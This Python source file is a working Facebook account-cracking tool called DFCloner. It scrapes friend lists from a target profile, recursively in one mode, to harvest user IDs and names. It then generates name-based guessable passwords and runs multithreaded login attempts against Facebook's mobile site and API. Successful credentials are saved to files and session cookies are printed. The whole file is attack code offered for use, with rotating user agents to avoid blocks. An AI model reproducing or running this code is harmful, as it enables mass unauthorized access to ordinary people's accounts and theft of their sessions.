# DFCloner V1.0
# A tool Created by OmniTotal (ToxicNoob Inc.)

import random
import sys
import time
import datetime
import os
import re
from bs4 import BeautifulSoup as bs
import requests
import concurrent.futures as cf


useragent=["Mozilla/5.0 (Linux; Android 10; SM-A202F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850F Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.4.0", "Mozilla/5.0 (Linux; Android 4.4.2; SMART Start Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.1; NS5003 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; ZB500KL Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 YandexSearch/7.35 YandexSearchBrowser/7.35", "Mozilla/5.0 (Linux; Android 6.0.1; SM-T700 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X007D Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 YaBrowser/18.3.1.651.00 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; 9005X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36"]

spacial_char = "!@#$%^&*<>~/?:"
numbers = "0123456789"

def logo():
    os.system("clear")
    os.system("""echo "
        ▛▀▖▛▀▘▞▀▖▜             
        ▌ ▌▙▄ ▌  ▐ ▞▀▖▛▀▖▞▀▖▙▀▖
        ▌ ▌▌  ▌ ▖▐ ▌ ▌▌ ▌▛▀ ▌  
        ▀▀ ▘  ▝▀  ▘▝▀ ▘ ▘▝▀▘▘ " | lolcat""")
    print("\n\033[92m   ╔══════════════════════════════════════════╗")
    print("   ║➣ TOOL NAME : DFCloner                    ║")
    print("   ║➣ AUTHOR    : Rafsanur Rafin              ║")
    print("   ║➣ WHATSAPP  : 01628143875                 ║")
    print("   ║➣ FACEBOOK  : facebook.com/rafsanur.rafin ║")
    print("   ║➣ Github    : github.com/DRUNK01          ║")
    print("   ║➣ YOUTUBE   : [ CRX71 GAMING ]            ║")
    print("   ╚══════════════════════════════════════════╝")

# Make new Key
def get_new_key(key_list):
    code = random.randint(00000, 99999)
    key = "DFCloner@544e496e63"+str(code)+"$$"
    if (key in key_list):
        key = get_new_key(key_list)
    
    return key
    
# Check Approval Permission Of Tool
def check_permission():
    logo()
    print("\n\033[92m    DrunkCracker is Paid Tool. Checking Approval")
    # get approved key list
    k3y_list = requests.get("https://raw.githubusercontent.com/DRUNK01/personal-respiratory-/main/file-clone-approval.txt").text
    
    if not os.path.exists("/data/data/com.termux/files/usr/lib/k3y_dfc.txt"):
        new_key = get_new_key(k3y_list)
        f = open("/data/data/com.termux/files/usr/lib/k3y_dfc.txt", "w")
        f.write(new_key)
        f.close()
    
    k3y = open("/data/data/com.termux/files/usr/lib/k3y_dfc.txt", "r").read()
    if (k3y == ""):
        new_key = get_new_key(k3y_list)
        f = open("/data/data/com.termux/files/usr/lib/k3y_dfc.txt", "w")
        f.write(new_key)
        f.close()
    
    k3y = open("/data/data/com.termux/files/usr/lib/k3y_dfc.txt", "r").read().replace("\n", "")
    
    if (k3y in k3y_list):
        print("\n\033[92m[\033[37m*\033[92m] Your Key is Approved!")
        time.sleep(0.5)
        return
    
    print("\n\033[37m[\033[91m!\033[37m] Your Key is Not Approved. You Need to Get Approval First!")
    print("\n\033[37m[\033[92m*\033[37m] Copy And Send Key To Admin")
    print("\n\033[37m[\033[92m*\033[37m] Your Key : " + k3y)
    print("\n\033[92m[\033[37m*\033[92m] Wait For Admin's Approval and Try Again Later!\033[37m\n")
    os.system(f"termux-open 'https://wa.me/+8801628143875?text=Dear Admin, Please Approved My Key To Premium Thanks My Name : My Key : {k3y}'")
    sys.exit()

# Set Custom Password
def choose_password():
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Custom Password Type: ")
    
    print("\n\033[37m[\033[92m01\033[37m] Name + Spacial Characters")
    print("\033[37m[\033[92m02\033[37m] Name + Numbers")
    print("\033[37m[\033[92m03\033[37m] Name + Custom Strings")
    print("\033[37m[\033[92m04\033[37m] Random Password Input")
    print("\033[37m[\033[92m05\033[37m] All Above")
    print("\033[37m[\033[92m06\033[37m] Only Tool Genarated")
    
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    while not inp in ["1", "2", "3", "4", "5", "6"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    global custom_pass_list
    custom_pass_list = {
        "append": [],
        "passwd": []
    }
    
    if (inp == "1"):
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        
        tmp_list = []
        for i in range(5):
            char = ""
            for i in range(random.choice([4,5])): char += str(random.choice(spacial_char))
            tmp_list.append(char)
        
        custom_pass_list["append"] = tmp_list[:]
        time.sleep(1)
        
    elif (inp == "2"):
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        
        tmp_list = []
        for i in range(5):
            char = ""
            for i in range(random.choice([3,4,5])): char += str(random.choice(numbers))
            tmp_list.append(char)
        
        custom_pass_list["append"] = tmp_list[:]
        time.sleep(1)
        
    elif (inp == "3"):
        tmp_list = []
        while True:
            string = input("\n\033[37m[\033[92m*\033[37m] Enter custom Strings (Leave Blank to Continue):> ")
            if (string == ""):
                break
            
            tmp_list.append(string)
        
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        time.sleep(1)
        custom_pass_list["append"] = tmp_list[:]
    
    elif (inp == "4"):
        tmp_list = []
        while True:
            name = input("\n\033[37m[\033[92m*\033[37m] Enter Passwords (Leave Blank to Continue):> ")
            if (name == ""):
                break
            
            tmp_list.append(name)
       
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        time.sleep(1)
        
        custom_pass_list["passwd"] = tmp_list[:]
    
    elif (inp == "5"):
        tmp_list1 = []
        tmp_list2 = []
        while True:
            string = input("\n\033[37m[\033[92m*\033[37m] Enter custom Strings (Leave Blank to Continue):> ")
            if (string == ""):
                break
           
            tmp_list1.append(string)
        
        while True:
            passs = input("\n\033[37m[\033[92m*\033[37m] Enter Passwords (Leave Blank to Continue):> ")
            if (passs == ""):
                break
            
            tmp_list2.append(passs)
       
        
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        time.sleep(1)
        
        custom_pass_list["append"] = tmp_list1[:]
        custom_pass_list["passwd"] = tmp_list2[:]
        
    elif (inp == "6"):
        print("\n\033[37m[\033[92m*\033[37m] Genarating Passwords...")
        time.sleep(1.5)

def create_pass_list(name):
    passwords = [name, name.upper(), name.lower(), name.title().replace(" ", ""), "123456", "57273200", "password"] + custom_pass_list["passwd"]
    adders = [ "#123", "12", "123","1234", "12345", "11", "1122"]
    
    for i in adders + custom_pass_list["append"]:
        passwords.append(name.split(" ")[0] + i)
        passwords.append(name.split(" ")[-1] + i)
        passwords.append(name + i)
        passwords.append(name.title().replace(" ", "") + i)
        passwords.append(name.replace(" ", "") + i)
    
    return passwords

# Cookie Converter
def convert_cookie(data):
    cookie_data = (
         "datr="+data["datr"]
               )+";"+(
         "c_user="+data["c_user"]
              )+";"+(
          "fr="+data["fr"]
              )+";"+(
            "xs="+data["xs"] )

    return cookie_data

# Mbasic Slow Process
done = 0
def process_mbasic(uname):
    if (uname == "" or uname == None):
        return
    uname = uname.replace("\n", "")
    
    username = uname.split(uidPattern)[0]
    passwords = create_pass_list(uname.split(uidPattern)[1])
    
    global done
    done += 1
    
    url = "https://mbasic.facebook.com/login.php"
    
    sys.stdout.write("\r\033[37m[\033[92m#\033[37m] Process Running [ \033[92m"+str(done)+" \033[37m/\033[92m "+str(idz)+" \033[37m]")
    
    ua = random.choice(useragent)
    
    headers={
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'host': 'mbasic.facebook.com',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
    
    for password in passwords:
        if (len(password) < 6):
            continue
        
        req=requests.Session()
            
        with req.get(url[0:27], headers=headers, timeout = 30) as bido:
            view=bs(bido.text, 'html.parser')
            lsd=view.find('input', {'name':'lsd'})['value']
            jazoest=view.find('input', {'name':'jazoest'})['value']
            m_ts=view.find('input', {'name':'m_ts'})['value']
            li=view.find('input', {'name':'li'})['value']
            try_number=view.find('input', {'name':'try_number'})['value']
            unrecognized_tries=view.find('input', {'name':'unrecognized_tries'})['value']
            bi_xrwh=view.find('input', {'name':'bi_xrwh'})['value']
    
            payload={'lsd':lsd, 'jazoest':jazoest, 'm_ts':m_ts, 'li':li, 'try_number':try_number, 'unrecognized_tries':unrecognized_tries, 'email':username, 'pass':password, 'login':'submit', 'bi_xrwh':bi_xrwh}
        
            resp=req.post(url, data=payload, headers=headers, allow_redirects=True)
        
            result = str(resp.content)
            
            if 'facebook-এ "শুধুমাত্র টেক্সট" ব্যবহার করুন' in result or 'save-device' in result or 'zero/optin/write/?action=confirm&page=dialtone_optin_page' in result or '/zero/optin/write/?action=cancel&page=dialtone_optin_page' in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m {' ' * 6}")
                print(f"\033[92mCOOKIE: \033[37m{convert_cookie(resp.cookies.get_dict())}")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                    
            elif "Help us confirm your name" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m {' ' * 6}")
                print(f"\033[92mCOOKIE: \033[37m{convert_cookie(resp.cookies.get_dict())}")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'mbasic_logout_button' in result or "Do you have a new mobile number?" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m {' ' * 6}")
                print(f"\033[92mCOOKIE: \033[37m{convert_cookie(resp.cookies.get_dict())}")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
        
            elif "Check the login details shown. Was it you?" in result:
                print(f"\r\033[92m[ OK: {username} || {password} ]\033[37m {' ' * 6}")
                print(f"\033[92mCOOKIE: \033[37m{convert_cookie(resp.cookies.get_dict())}")
                open('ok.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'facebook.com/secure_account_learn_more/?uid' in result or 'Login approval needed' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m {' ' * 6}")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif 'disabled_checkpoint' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m {' ' * 6}")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif '/x/checkpoint/828281030927956' in result:
                print(f"\r\033[91m[ CP: {username} || {password} ]\033[37m {' ' * 6}")
                open('cp.txt','a').write(f'{username} || {password}\n')
                break
                
            elif '<title>error</title>' in result.lower() or "you have been blocked" in result.lower():
                break
            
            else:
                open("tmp.html", "w").write(result)

# Process with fast api
done = 0
def process_api(uname):
    if (uname == "" or uname == None):
        return
    uname = uname.replace("\n", "")
    
    username = uname.split(uidPattern)[0]
    passwords = create_pass_list(uname.split(uidPattern)[1])
    
    global done
    done += 1
    
    sys.stdout.write("\r\033[37m[\033[92m#\033[37m] Process Running [ \033[92m"+str(done)+" \033[37m/\033[92m "+str(idz)+" \033[37m]")
    
    for password in passwords:
        if (len(password) < 6):
            continue
        
        ua = random.choice(useragent)
        headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"
        }
        
        result = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+username+"&password="+password+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        
        if "session_key" in result.text and "EAAA" in result.text:
            print(f"\r\033[92m[ OK: {username.replace('%2B', '+')} || {password} ]\033[37m {' ' * 6}")
            open('ok.txt','a').write(f'{username.replace("%2B", "+")} || {password}\n')
            break
            
        elif "www.facebook.com" in result.json()["error_msg"]:
            print(f"\r\033[91m[ CP: {username.replace('%2B', '+')} || {password} ]\033[37m {' ' * 6}")
            open('cp.txt','a').write(f'{username.replace("%2B", "+")} || {password}\n')
            break
            
        else:
            open("tmp.html", "w").write(result.text)

# Parse List Data
def get_list_data(uid, cookie):
    parsedUID = 0
    pattern = r"(\d+)"
    listData = []
    
    ses = requests.Session()
    cookies  = {"cookie": cookie}
    ses.cookies.update(cookies)
    
    listUrl = f"https://mbasic.facebook.com/profile.php?id={uid}&v=friends"
    print(f"\r\033[37m[\033[92m*\033[37m] Parsed {parsedUID} Idz", end = "")
    while True:
        html = ses.get(listUrl).text
        # open("frnd.html", "w").write(html)
        parser = bs(html, "html.parser")
        span_tags = parser.find_all('span', string='Add Friend')
        
        if (span_tags == None):
            return []
            
        parsedUID += len(span_tags)
        for tag in span_tags:
            a_tag = tag.find_parent('a')
            div_tag = a_tag.find_parent('div')
            td_tag = div_tag.find_parent('td')
            aTag = td_tag.find('a')
            
            idUrl = aTag["href"]
            if ("profile.php?id=" in idUrl):
                idUid = re.search(pattern, idUrl).group()
            else:
                idUid = idUrl.split("?eav=")[0].replace("/", "")
                
            name = aTag.text
            listData.append(f"{idUid}|{name}")
            
        print(f"\r\033[37m[\033[92m*\033[37m] Parsed {parsedUID} Idz", end = "")
        divTag = parser.find("div", {"id": "m_more_friends"})
        if (divTag == None):
            break
        
        listUrl = "https://mbasic.facebook.com" + divTag.a["href"]
    
    return listData

# Create Normal File
def create_normal_file():
    logo()
    os.system("rm .uidFile > /dev/null 2>&1")
    try:
        cookie = open(".cookie", "r").read()
        if (cookie == ""):
            cookie = input("\n\033[37m[\033[92m*\033[37m] Enter Your Cookie:> ")
            open(".cookie", "w").write(cookie)
            logo()
    except:
        cookie = input("\n\033[37m[\033[92m*\033[37m] Enter Your Cookie:> ")
        open(".cookie", "w").write(cookie)
        logo()
    
    print("\n\033[37m[\033[92m*\033[37m] Logging In...")
    ses = requests.Session()
    cookies  = {"cookie": cookie}
    ses.cookies.update(cookies)
    
    profileHtml = ses.get("https://mbasic.facebook.com/me").text
    if not ("profile_cover_photo_container" in profileHtml):
        print("\n\033[37m[\033[91m!\033[37m] Cookie Expired or ID in Checkpoint!")
        os.system("rm .cookie")
        sys.exit("\033[37m")
    
    print("\033[37m[\033[92m*\033[37m] Login Successfull!")
    
    uid = input("\n\033[37m[\033[92m*\033[37m] Enter Target UID (Ex: 1000024xxxxxx):> ")
    filePath = input("\n\033[37m[\033[92m*\033[37m] Enter save File Path \033[92m(\033[37mEx: /sdcard/test.txt\033[92m)\033[37m:> ")
    while True:
        try:
            file = open(filePath, "w")
            break
        except:
            print("\n\033[37m[\033[91m!\033[37m] File Path isn't accessable!")
            filePath = input("\n\033[37m[\033[92m*\033[37m] Enter save File Path \033[92m(\033[37mEx: /sdcard/test.txt\033[92m)\033[37m:> ")
    
    logo()
    print("\n\n\033[37m[\033[92m*\033[37m] Parsing UID: " + uid)
    
    fileData = get_list_data(uid, cookie)
    if (len(fileData) == 0):
        print("\n\033[37m[\033[91m!\033[37m] ID Friend List isn't Public!")
        sys.exit("")
    
    file.write("\n".join(fileData))
    file.close()
    
    print("\n\n\n\033[37m[\033[92m*\033[37m] File Create Complete!")
    print("\n\033[37m[\033[92m*\033[37m] Saved in: " + filePath)
    sys.exit("")

#  Create NonStop File
def create_nonstop_file():
    logo()
    os.system("rm .uidFile > /dev/null 2>&1")
    try:
        cookie = open(".cookie", "r").read()
        if (cookie == ""):
            cookie = input("\n\033[37m[\033[92m*\033[37m] Enter Your Cookie:> ")
            open(".cookie", "w").write(cookie)
    except:
        cookie = input("\n\033[37m[\033[92m*\033[37m] Enter Your Cookie:> ")
        open(".cookie", "w").write(cookie)
    
    print("\n\033[37m[\033[92m*\033[37m] Logging In...")
    ses = requests.Session()
    cookies  = {"cookie": cookie}
    ses.cookies.update(cookies)
    
    profileHtml = ses.get("https://mbasic.facebook.com/me").text
    if not ("profile_cover_photo_container" in profileHtml):
        print("\n\033[37m[\033[91m!\033[37m] Cookie Expired or ID in Checkpoint!")
        os.system("rm .cookie")
        sys.exit("\033[37m")
    
    print("\033[37m[\033[92m*\033[37m] Login Successfull!")
    
    uid = input("\n\033[37m[\033[92m*\033[37m] Enter Target UID (Ex: 1000024xxxxxx):> ")
    parentUid = uid
    filePath = input("\n\033[37m[\033[92m*\033[37m] Enter save File Path \033[92m(\033[37mEx: /sdcard/test.txt\033[92m)\033[37m:> ")
    while True:
        try:
            file = open(filePath, "w")
            break
        except:
            print("\n\033[37m[\033[91m!\033[37m] File Path isn't accessable!")
            filePath = input("\n\033[37m[\033[92m*\033[37m] Enter save File Path \033[92m(\033[37mEx: /sdcard/test.txt\033[92m)\033[37m:> ")
    
    
    logo()
    print("\n\n\033[37m[\033[92m!\033[37m] Press ctrl + c to Stop")
    
    print("\n\n\033[37m[\033[92m*\033[37m] Parsing UID: " + uid)
    
    fileData = get_list_data(uid, cookie)
    if (len(fileData) == 0):
        print("\n\033[37m[\033[91m!\033[37m] ID Friend List isn't Public!")
        sys.exit("")
    
    file.write("\n".join(fileData))
    file.close()
    
    for user in fileData:
        uid = user.split("|")[0]
        print("\n\n\033[37m[\033[92m*\033[37m] Parsing UID: " + uid)
        try:
            fileData += get_list_data(uid, cookie)
        except:
            break
        
        file = open(filePath, "w")
        file.write("\n".join(fileData))
        file.close()
    
    
    print("\n\n\n\033[37m[\033[92m*\033[37m] File Create Complete!")
    print("\n\033[37m[\033[92m*\033[37m] Saved in: " + filePath)
    sys.exit("")


# Crack Id
def crack_file(method):
    logo()
    filePath = input("\n\033[37m[\033[92m*\033[37m] Enter Your File Path:> ")
    while not os.path.isfile(filePath):
        print("\n\033[37m[\033[91m!\033[37m] File Path not Found!")
        filePath = input("\n\033[37m[\033[92m*\033[37m] Enter Your File Path:> ")
    
    print("\n\033[92m[\033[37m*\033[92m] \033[37mCheck your File and Enter your File Pattern")
    print("\033[92m[\033[37m*\033[92m] \033[37mEnter UID as \033[92muid\033[37m and Name as \033[92mname\033[37m")
    print("\033[92m[\033[37m*\033[92m] \033[37mExample: If your File's Data is as: \033[92m10000xxxxxd|Rahat Khan\033[37m Then enter: \033[92muid|name\033[37m")
    filePattern = input("\n\033[37m[\033[92m*\033[37m] Enter File Pattern \033[92m(\033[37mDefault: uid|name\033[92m)\033[37m:> ")
    
    while not ((filePattern == "") or ("uid" in filePattern and "name" in filePattern)):
        print("\n\033[37m[\033[91m!\033[37m] Pattern must include \033[92muid\033[37m and \033[92mname\033[37m")
        filePattern = input("\n\033[37m[\033[92m*\033[37m] Enter File Pattern \033[92m(\033[37mDefault: uid|name\033[92m)\033[37m:> ")
    
    if (filePattern == ""):
        filePattern = "uid|name"
    global uidPattern
    uidPattern = filePattern.replace("uid", ""). replace("name", "")
    
    fileData = open(filePath, "r").readlines()
    
    global idz
    idz = len(fileData)
    
    choose_password()
    
    logo()
    print("\n\033[92m[\033[37m!\033[92m] File Cracking Started!")
    
    print("\033[92m[\033[37m!\033[92m] Please Wait While Account is being Cracked!")
    print("\033[92m[\033[37m!\033[92m] Turn on Airplane Mode for 5 Sec if no Result")
    print("\033[92m[\033[37m!\033[92m] Press \033[37m ctrl \033[92m+ \033[37mz \033[92mTo Exit!\n")
    
    if (method == "mbasic"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_mbasic, fileData)
            pool.shutdown(wait=True)
            time.sleep(1)
    elif (method == "api"):
        with cf.ThreadPoolExecutor(max_workers=20) as pool:
            pool.map(process_api, fileData)
            pool.shutdown(wait=True)
            time.sleep(0.2)
    
    

def mainMenu():
    logo()
    print("\n\033[37m[\033[92m*\033[37m] Choose Your Option: ")
    
    global crack_type
    print("\n\033[37m[\033[92m01\033[37m] File Maker \033[92m(\033[37mNormal\033[92m)\033[37m")
    print("\033[37m[\033[92m02\033[37m] File Maker \033[92m(\033[37mNon-Stop\033[92m)\033[37m")
        
    print("\n\033[37m[\033[92m03\033[37m] File Cloning \033[92m(\033[37mSlow\033[92m)\033[37m")
    print("\033[37m[\033[92m04\033[37m] File Cloning \033[92m(\033[37mFast\033[92m)\033[37m")
    
    print("\n\033[37m[\033[92m05\033[37m] Logout \033[92m(\033[37mRemove Cookie\033[92m)\033[37m")
    print("\033[37m[\033[92m06\033[37m] Exit")
        
    inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
        
    while not inp in ["1", "2", "3", "4", "5", "6"]:
        print("\n\033[37m[\033[91m!\033[37m] Please Choose a Correct Option!")
        inp = input("\n\033[37m[\033[92m*\033[37m] Enter Your Choice:> ").replace("0", "")
    
    if (inp == "1"):
        create_normal_file()
    elif (inp == "2"):
        create_nonstop_file()
    elif (inp == "3"):
        crack_file("mbasic")
    elif (inp == "4"):
        crack_file("api")
    elif (inp == "5"):
        os.system("rm .cookie > /dev/null 2>&1")
        print("\n\033[37m[\033[92m*\033[37m] Cookie Removed!")
        sys.exit("")
    elif (inp == "6"):
        sys.exit("\033[37m")

if (__name__ == "__main__"):
    #check_permission()
    mainMenu()
